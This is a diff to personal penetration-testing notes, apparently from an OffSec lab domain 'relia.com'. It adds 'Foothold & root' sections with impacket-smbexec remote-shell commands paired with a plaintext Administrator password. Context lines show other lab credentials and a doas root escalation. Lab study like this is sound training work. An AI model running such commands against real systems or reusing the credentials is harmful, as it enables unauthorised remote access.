@@ -1,4 +1,4 @@
-# VM 1 .6
+# VM 1 .6 (pwned)
 - DC02
 ```
 PORT      STATE SERVICE       VERSION
@@ -56,8 +56,12 @@ Host script results:
 | smb2-time: 
 |   date: 2024-08-18T05:16:53
 |_  start_date: N/A
+```
 
-
+## Foothold & root
+```
+impacket-smbexec "relia.com/Administrator@172.16.166.6"
+vau!XCKjNQBv2$
 ```
 
 # VM 4 .14 (pwned)
@@ -117,7 +121,7 @@ proof.txt is put under users/offsec folder -,-
  dmzadmin:SlimGodhoodMope
 ```
 
-# VM 5 .30
+# VM 5 .30 (pwned)
 - WEBBY
 ```
 PORT      STATE SERVICE       VERSION
@@ -226,6 +230,12 @@ Host script results:
 |   date: 2024-08-18T05:36:13
 |_  start_date: N/A
 |_clock-skew: mean: -1s, deviation: 0s, median: -1s
+```
+
+## Foothold & root
+```
+impacket-smbexec "relia.com/Administrator@172.16.166.30"
+vau!XCKjNQBv2$
 ```
 
 # VM 6 .15 (pwned)
@@ -398,7 +408,7 @@ abusing doas (freebsd): /usr/local/etc/doas.conf
 - ``` doas -s ``` 
 - ``` sshpass -p "DRtajyCwcbWvH/9" ssh mountuser@172.16.10.21`
 
-# VM 9 .21
+# VM 9 .21 (pwned)
 - FILES
 ```
 PORT      STATE SERVICE       VERSION
@@ -426,6 +436,13 @@ Host script results:
 |   date: 2024-08-18T05:16:54
 |_  start_date: N/A
 |_clock-skew: -1s
+```
+
+## Foothold & root
+1. found administrator and password in smb share monitoring script
+```
+impacket-smbexec "relia.com/Administrator@172.16.166.21"
+vau!XCKjNQBv2$
 ```
 
 # VM 15 .7 (pwned)
